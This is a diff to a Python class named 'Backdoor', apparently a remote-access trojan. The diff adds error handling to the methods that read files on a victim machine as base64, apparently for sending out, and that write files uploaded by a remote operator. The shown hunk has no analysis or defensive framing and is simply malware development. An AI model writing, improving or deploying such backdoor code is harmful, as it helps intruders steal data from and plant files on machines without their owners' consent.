@@ -57,13 +57,23 @@ class Backdoor:
 
 
     def read_file(self, path):
-        with open(path, "rb") as file:
-            return base64.b64encode(file.read()).decode()  # base64 encode 
+        try:
+            with open(path, "rb") as file:
+                return base64.b64encode(file.read()).decode()
+        except FileNotFoundError:
+            return f"[!] File not found: {path}"
+        except PermissionError:
+            return f"[!] Permission denied: {path}"
+        except Exception as e:
+            return f"[!] Error reading file: {e}"
 
     def write_file(self, path, content):
-        with open(path, "wb") as file:
-            file.write(base64.b64decode(content))  # base64 decode karke 
-        return "File uploaded successfully\n".encode() if content else "No content to write\n".encode()
+        try:
+            with open(path, "wb") as file:
+                file.write(base64.b64decode(content))
+            return "File uploaded successfully\n".encode()
+        except Exception as e:
+            return f"[!] Error writing file: {e}\n".encode()
 
     def run(self):
         while True:
